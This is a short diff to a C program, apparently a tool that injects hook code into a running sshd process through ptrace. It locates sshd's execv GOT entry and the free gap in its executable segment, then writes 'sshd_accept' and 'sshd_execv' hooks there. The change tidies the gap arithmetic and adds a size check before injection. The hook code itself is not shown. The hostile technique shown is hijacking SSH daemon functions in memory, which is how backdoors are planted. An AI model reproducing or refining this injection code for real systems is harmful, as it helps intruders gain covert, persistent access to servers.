@@ -72,10 +72,12 @@ main (int argc, char **argv)
   uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
 
   uint64_t sshd_rx_start = sshd_base + get_seg_gap (SSHD_PATH, 5);
-  uint64_t sshd_rx_gap = sshd_rx_start % 0x1000;
-  printf ("sshd_rx_gap: 0x%lx\n", (0x1000 - sshd_rx_gap));
-  printf ("while we need 0x%lx\n",
-          (sizeof (sshd_accept) + sizeof (sshd_execv)));
+  uint64_t sshd_rx_gap = 0x1000 - (sshd_rx_start % 0x1000);
+  uint64_t code_size = sizeof (sshd_accept) + sizeof (sshd_execv);
+  printf ("sshd_rx_gap: 0x%lx\n", sshd_rx_gap);
+  printf ("while we need 0x%lx\n", code_size);
+  if (sshd_rx_gap < code_size)
+    PEXIT ("Too bad the rx_gap is not big enough for inject code");
 
   uint64_t accept_hook_start = sshd_rx_start;
   copy_to_tracee (pid, accept_hook_start, sshd_accept, sizeof (sshd_accept));
